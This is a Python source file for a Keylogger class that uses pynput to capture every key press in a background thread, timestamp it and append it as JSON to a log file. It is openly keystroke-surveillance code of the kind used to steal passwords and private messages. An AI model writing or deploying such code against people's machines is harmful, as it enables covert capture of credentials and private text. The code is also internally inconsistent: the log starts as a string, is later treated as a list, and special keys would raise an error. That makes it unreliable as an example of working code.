from pynput import keyboard
import threading, json
from typing import Optional, List
from datetime import datetime


class Keylogger:
    def __init__(
        self,
        max_log_size: int = 10000,
        log_file: Optional[str] = None,
        filter_keys: Optional[List[str]] = [],
    ) -> None:
        """
        Initialize the Keylogger with configuration options.

        Args:
            max_log_size: Maximum number of keystrokes to keep in memory before saving to file
            log_file: Optional file path to save the keystroke log
            filter_keys: List of keys to ignore (won't be logged)
        """
        self._listener: Optional[keyboard.Listener] = None  # Keyboard listener instance
        self._thread: Optional[threading.Thread] = None  # Thread for the listener
        self.is_listening = False  # Flag to track if keylogger is active
        self.log = ""  # Stores keystrokes as string (initial implementation)
        self._stop_event = threading.Event()  # Event to signal stopping
        self.filter_keys = filter_keys  # Keys to filter out
        self.max_log_size = max_log_size  # Max log size before saving
        self.log_file = log_file  # File to save logs to

    def _on_press(self, key) -> None:
        """
        Callback function that handles key press events.

        Args:
            key: The key that was pressed
        """
        try:
            self.log += key.char  # Try to get the character representation
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += f"[{key.name}]"

        # Skip processing if key is in filter list
        if key.char in self.filter_keys:
            return

        # Create log entry dictionary
        log_entry = {
            "timestamp": datetime.now().isoformat(),  # Current timestamp
            "key": key.char,  # The pressed key
        }
        self.log.append(log_entry)  # Add to log

        # Save to file if max size reached
        if len(self.log) >= self.max_log_size:
            self._save_log_to_file()

    def _save_log_to_file(self) -> None:
        """Save the current log to the configured log file in JSON format."""
        if not self.log_file:
            return  # Do nothing if no log file specified

        # Convert log to JSON and append to file
        log_data = json.dumps(self.log, indent=2)
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(log_data + "\n")
        self.log.clear()  # Clear in-memory log after saving

    def _start_listener(self) -> None:
        """Start the keyboard listener in a separate thread."""
        with keyboard.Listener(on_press=self._on_press) as listener:
            self._listener = listener
            listener.join()  # Block until listener stops

    def start(self) -> None:
        """Start the keylogger if not already running."""
        if not self.is_listening:
            self.is_listening = True
            self.log = ""  # Reset log
            # Start listener in a new thread
            self._thread = threading.Thread(target=self._start_listener)
            self._thread.start()

    def stop(self) -> None:
        """Stop the keylogger if it's running."""
        if self.is_listening and self._listener:
            self.is_listening = False
            self._listener.stop()  # Stop the listener
            if self._thread:
                self._thread.join()  # Wait for thread to finish

    def get_log(self, as_string: bool = False) -> str | List[dict]:
        """
        Get the current keystroke log.

        Args:
            as_string: If True, returns log as formatted string. Otherwise returns raw log data.

        Returns:
            The keystroke log in requested format
        """
        if as_string:
            # Format log entries as timestamp: key
            return "\n".join(
                [f"{entry['timestamp']}: {entry['key']}" for entry in self.log]
            )
        return self.log

    def clear_log(self) -> None:
        """Clear the current in-memory log."""
        self.log.clear()
